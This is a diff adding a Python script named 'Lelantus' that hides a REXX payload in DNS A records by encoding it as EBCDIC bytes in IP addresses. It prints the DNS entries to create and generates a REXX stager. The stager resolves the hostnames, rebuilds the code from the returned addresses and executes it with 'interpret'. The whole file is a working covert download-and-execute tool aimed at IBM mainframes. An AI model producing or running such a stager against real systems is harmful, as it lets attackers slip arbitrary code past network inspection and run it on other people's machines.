@@ -1,0 +1,138 @@
+#!/usr/bin/python
+import socket
+import sys, time
+import struct
+
+
+import argparse
+
+header = '''
+ ___      _______  ___      _______  __    _  _______  __   __  _______
+|   |    |       ||   |    |   _   ||  |  | ||       ||  | |  ||       |
+|   |    |    ___||   |    |  |_|  ||   |_| ||_     _||  | |  ||  _____|
+|   |    |   |___ |   |    |       ||       |  |   |  |  |_|  || |_____
+|   |___ |    ___||   |___ |       ||  _    |  |   |  |       ||_____  |
+|       ||   |___ |       ||   _   || | |   |  |   |  |       | _____| |
+|_______||_______||_______||__| |__||_|  |__|  |___|  |_______||_______|
+
+
+               Appearances are a glimpse of the unseen...
+
+'''
+
+
+
+parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description=header)
+parser.add_argument("--realdns", help="Set if you want to use existing DNS entries (very alpha)", action='store_true')
+parser.add_argument("-tld", help="TLD for generated dns-entries", required=True)
+parser.add_argument('-infile', help="The REXX payload you want to store in DNS", required=True)
+args = parser.parse_args()
+
+
+
+
+
+with open(args.infile) as code_stream:
+	code = code_stream.read()
+charval = {}
+
+
+def char2oct(someChar):
+  '''Takes 1-byte character and returns
+  the EBCDIC integer value for it'''
+  ebcdicChar = someChar.encode('cp500')
+  intval = struct.unpack('<B',ebcdicChar)[0]
+  return intval
+
+def b42ip(char4):
+  '''Takes a 4 byte string and returns
+  the dotted decimal ipv4 notation'''
+  a = char2oct(char4[0])
+  b = char2oct(char4[1])
+  c = char2oct(char4[2])
+  d = char2oct(char4[3])
+  return '%s.%s.%s.%s' % (a,b,c,d)
+
+def gendsn(domain):
+	import random
+	import string
+	host =  ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(7))
+	return host + "." + domain
+
+
+result = []
+toadd = {}
+hostfile = []
+print header
+
+extra = "    Generating REXX and DNS"
+print extra
+total=len(code.split('\n'))
+for loc in code.split('\n'):
+    line = []
+    done = 0
+    is4 = len(loc) % 4
+    while is4:
+        loc += " "
+        is4 = len(loc) % 4
+    ips = [loc[i:i+4] for i in range(0, len(loc), 4)]
+    for ip in ips:
+        o1 = char2oct(ip[0])
+        o2 = char2oct(ip[1])
+        o3 = char2oct(ip[2])
+        o4 = char2oct(ip[3])
+        theip = b42ip(ip)
+        if theip in toadd:
+       	    dns = toadd[theip]
+    	    line.append([dns, theip])
+        else:
+            if args.realdns:
+                try:
+                    dns = socket.gethostbyaddr(theip)[0]
+                except:
+                    dns = gendsn(args.tld)
+            else:
+                dns = gendsn(args.tld)
+            line.append([dns, theip])
+            toadd[theip] = dns
+    result.append(line)
+
+
+
+print "Required DNS entries:"
+for line in result:
+    for entry in line:
+        print "%s -> %s" % (entry[0], entry[1])
+
+# Now generate the REXX
+print "-------_YOUR_REXX_SCRIPT-----------"
+print ""
+print "/* REXX */"
+print "/* Proof of Concept */"
+
+for a in result:
+	print "cline = ''"
+	for char4 in a:
+            print "cline = cline || ip24b('"+char4[0]+"')"
+	print "interpret cline"
+
+print "exit 0"
+print '''
+ip24b: procedure
+  parse arg dns
+  res = ""
+  src = socket("INITIALIZE","MYSET01");
+  a = socket("GETHOSTBYNAME", dns)
+  parse var a RC STUFF
+  if RC = "0" then do;
+    parse var STUFF oct1 "." oct2 "." oct3 "." oct4
+    res = res ||d2c(oct1)
+    res = res ||d2c(oct2)
+    res = res ||d2c(oct3)
+    res = res ||d2c(oct4)
+  end;
+  src = socket("TERMINATE","MYSET01");
+  return res
+  '''
+
+
